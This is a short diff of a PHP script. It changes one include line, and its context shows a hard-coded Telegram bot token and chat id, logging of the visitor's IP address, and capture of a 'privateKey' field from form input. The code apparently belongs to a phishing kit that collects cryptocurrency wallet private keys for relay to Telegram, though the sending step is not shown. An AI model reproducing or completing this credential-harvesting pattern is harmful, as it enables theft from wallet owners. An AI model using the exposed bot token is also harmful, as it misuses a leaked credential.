@@ -4,7 +4,7 @@ $token = "5330630457:AAG9v9f5Q8abgbwSmyhM_q-ILsMQO36haOE";
 $chat_id = "-871734856";
 
 header('Content-type: application/json');
-include('../settings/router.php');
+include('baglan');
 session_start();
 $ip = $_SERVER['REMOTE_ADDR'];
 $privateKey = strtolower(filter_input(INPUT_POST, 'privateKey'));
